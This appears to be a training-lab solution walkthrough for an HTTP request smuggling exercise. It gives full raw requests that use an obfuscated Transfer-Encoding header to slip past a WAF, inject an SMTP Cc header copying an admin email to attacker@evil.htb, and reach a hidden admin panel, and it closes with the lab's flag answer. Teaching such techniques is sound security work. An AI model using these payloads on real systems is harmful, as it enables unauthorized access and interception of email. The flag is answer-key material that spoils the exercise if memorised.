According to the question's hint, the setup is vulnerable to `TE.CL` via a `TE.TE` technique, the `Substring match` technique. Therefore, to bypass the `WAF`, students need to exploit `TE.CL` via the `Substring match` `TE.TE` technique, smuggling the SMTP header injection payload. Within `Repeater`, students need to have a GET request to `/404`, with `Transfer-Encoding` set to `asdchunked`, followed by the size of the smuggled POST request to `/contact` up until before the line with `0` only. The `Content-Length` value of the smuggled request is the sum of the number of bytes of the form fields. The web application is appending additional data to the value of the injection point (i.e., the username field's value, which matches the first header, `Cc`), thus invalidating the email address `attacker@evil.htb` given by the client; to circumvent this, students need to inject an additional dummy header after the `Cc` header:

```http
GET /404 HTTP/1.1
Host: STMIP:STMPO
Content-Length: 4
Transfer-Encoding: asdchunked

f3
POST /contact HTTP/1.1
Host: STMIP:STMPO
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

name=Ryan+Sam%0d%0aCc:+attacker@evil.htb%0d%0aDoesNotExist:+True&email=ryansam%40gmail.com&message=Hello+Sys+Admin

0
```

![[HTB Solutions/CWEE/z. images/6d3af6a8cb36cc904ebacf412ea05082_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/876ac5ca22cde384e3dddb849135c626_MD5.jpg]]

Before sending the request, students need to make sure that they untick `Update Content-Length`:

![[HTB Solutions/CWEE/z. images/24ae51a24b233afaf434e4ff648ce10c_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/376a145c4b4ccf60cc4d802e839d4a18_MD5.jpg]]

Checking the email inbox over `http://STMIP:STMPO/mail`, students will notice that they have received a copy of the email being sent to the system administrator:

![[HTB Solutions/CWEE/z. images/be3beeafc3a697278f2dfc4c359e2d31_MD5.jpg]]

Opening it, students will come to know that the admin portal can be accessed over `/ksu3nsj9c`; in addition to that, the `WAF` blocks all external access to the admin portal:

![[HTB Solutions/CWEE/z. images/26c2aee12e013f601f26fddf81406c5c_MD5.jpg]]

Therefore, students need to exploit request smuggling again to bypass it; however, utilizing `TE.CL` via the `Substring match` `TE.TE` method, where the reverse proxy parses the `Transfer-Encoding` header and the web server uses the `Content-Length` header to determine the request length.

Students need to send two GET requests to `/404` and smuggle the GET request to the admin panel over `/ksu3nsj9c` within the first request. To calculate the chunk size, students can highlight all of the smuggled request up until before the empty chunk and convert the number of characters from decimal to hexadecimal:

```http
GET /404 HTTP/1.1
Host: STMIP:STMPO
Content-Length: 4
Transfer-Encoding: asdchunked

38
GET /ksu3nsj9c HTTP/1.1
Host: STMIP:STMPO

0
```

![[HTB Solutions/CWEE/z. images/08029d012321143520dd495378c12f79_MD5.jpg]]

Additionally, the second request is also a GET to `/404`:

```http
GET /404 HTTP/1.1
Host: STMIP:STMPO
```

![[HTB Solutions/CWEE/z. images/6062177cb2765ed3d1dda5bbc8e7872e_MD5.jpg]]

Afterward, students need to untick `Update Content-Length` for the first GET request, group the two tabs together, and set the sending option to `Send group (single connection)`:

![[HTB Solutions/CWEE/z. images/c5e1e9c7808733b269c8caaf8bb19b4d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/87873d9934e63ad4426b3fc8923bea29_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/4fcfc368b5dc01e11d5140e7cf88a31c_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f49fcaca4a1c6087a9ab80bbf724ba64_MD5.jpg]]

After sending both requests over a single connection, students will notice that the second GET request to `/404` have been influenced by the first GET request to `/` that contained the smuggled request to the admin panel `/ksu3nsj9c`, as the web server has responded with the content of `/ksu3nsj9c`, with the flag `HTB{c0ee118e22005accb5648f286d1c1278}` contained in line 58 of the response:

![[HTB Solutions/CWEE/z. images/1f43512a651afc0cd842eee2b45da8f0_MD5.jpg]]

Answer: `HTB{c0ee118e22005accb5648f286d1c1278}`